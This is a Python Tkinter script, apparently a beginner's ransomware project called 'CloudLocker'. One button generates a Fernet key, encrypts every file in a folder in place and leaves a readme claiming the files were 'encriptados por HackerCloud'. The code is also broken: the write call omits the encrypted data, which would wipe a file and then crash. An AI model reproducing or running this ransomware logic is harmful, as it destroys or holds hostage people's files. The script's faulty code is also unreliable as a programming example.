from cryptography.fernet import Fernet
import os
from tkinter import *
import tkinter as tk

root = Tk()
root.title("CloudLocker")
root.geometry("300x150")
root.resizable(0, 0)
root.config(bg="gray")

def presionarBoton():

    def generar_key():
        key = Fernet.generate_key()
        with open("key.key", "wb") as key_file:
            key_file.write(key)

    def retornar_key():
        return open("key.key", "rb").read()

    def encrypt(items, key):
        i = Fernet(key)
        for x in items:
            with open(x, "rb") as file:
                file_data = file.read()
            data = i.encrypt(file_data)

            with open(x, "wb") as file:
                file.write()

    if __name__ == "__main__":


        archivos = "/archivos"
        items = os.listdir(archivos)
        archivo_2 = [archivos+"/"+x for x in items]


    generar_key()
    key = retornar_key()


    encrypt(archivo_2, key)

    with open(archivos+"/"+"readme.txt", "w") as file:
        file.write("Archivos encriptados por HackerCloud")


def pararTodo():
    root.destroy()


Botoninicio = Button(root, bg="red", command=presionarBoton, text="Encriptar archivos").pack()
BotonParar = Button(root, bg="blue", command=pararTodo, text="Parar").pack()


root.mainloop()